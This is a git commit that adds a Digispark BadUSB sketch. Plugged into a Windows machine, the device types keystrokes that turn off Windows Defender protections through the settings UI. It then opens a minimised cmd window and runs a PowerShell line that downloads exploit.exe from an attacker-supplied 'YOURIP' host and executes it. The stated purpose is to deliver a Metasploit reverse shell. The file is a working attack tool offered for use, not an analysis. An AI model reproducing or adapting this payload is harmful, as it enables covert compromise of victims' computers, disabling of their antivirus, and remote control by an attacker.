0273c7718eff03111a0560f2100a010623ae141b
V01demort <110058202+EndlssNightmare@users.noreply.github.com>
2024-01-22 00:41:14 -0300

    Create cmdrevshell.ino
    Work's better with an Assembly reverse shell.

---
+++ Metasploit-Revshell/Smallcmdshell/cmdrevshell.ino
@@ -0,0 +1,77 @@
+#include "DigiKeyboard.h"
+#include "DigiKeyboardPtBr.h"
+
+void setup() {
+  pinMode(0,OUTPUT); 
+  pinMode(1,OUTPUT);     
+}
+
+void loop() {
+pisca_led(100);
+  //Desliga o Windows Defender
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //Minimiza todas as janelas abertas
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  //Abre o executar
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println("Windowsdefender://threat/");  //Abre o windows defender pelo executar
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("\t\t\t\t"); //4 TAB
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("\t\t");  //2 TAB
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("\t\t\t\t"); //4 TAB
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("\t\t\t\t"); //4 TAB
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("\t\t");  //2 TAB
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
+  DigiKeyboard.delay(5000);
+  //Download assembly script
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.print("\t\t");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("cmd /c powershell -Command wget 'http://YOURIP/exploit.exe' -Outfile c:/windows/temp/exploit.exe ; c:/windows/temp/exploit.exe");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);
+  //
+ pisca_led(1000); 
+  for(;;){ /*empty*/ } 
+}
+
+void pisca_led(int velocidade){  
+  for (int inicio =1; inicio <= 10; inicio ++) {
+    digitalWrite(0, HIGH); 
+    digitalWrite(1, HIGH); 
+    DigiKeyboardPtBr.delay(velocidade);  
+    digitalWrite(0, LOW); 
+    digitalWrite(1, LOW); 
+    DigiKeyboardPtBr.delay(velocidade);  
+  } 
+}
